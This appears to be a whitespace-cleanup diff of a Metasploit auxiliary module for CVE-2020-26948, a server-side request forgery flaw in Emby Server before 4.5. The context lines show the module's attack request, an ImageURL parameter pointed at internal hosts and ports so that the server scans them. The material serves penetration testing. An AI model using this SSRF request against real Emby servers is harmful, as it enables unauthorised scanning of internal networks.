@@ -8,7 +8,7 @@
 # Software Link: https://emby.media/download.html
 # Version: Prior to 4.5
 # Tested on: Ubuntu, Windows
-# CVE : CVE-2020-26948
+# CVE: CVE-2020-26948
 ##
 
 class MetasploitModule < Msf::Auxiliary
@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
   end
   def run_host(target_host)
     begin
-      
+
         # Do some checking to ensure data is submitted
       dports = Rex::Socket.portspec_crack(datastore['PORTS'])
       if dports.empty?
@@ -51,8 +51,8 @@ class MetasploitModule < Msf::Auxiliary
       # loop through the IPs
       dports.each do |p|
         vprint_status("Attempting http://#{datastore['EMBY_SERVER']}:#{datastore['EMBY_PORT']}/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}")
-        uri = "/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}"        
-        
+        uri = "/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://#{target_host}:#{p}"
+
         res = Net::HTTP.get_response(datastore['EMBY_SERVER'], uri, datastore['EMBY_PORT'])
 
         # Check for Response
@@ -106,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      rescue ::Timeout::Error, ::Errno::EPIPE      
+      rescue ::Timeout::Error, ::Errno::EPIPE
 
 
     end
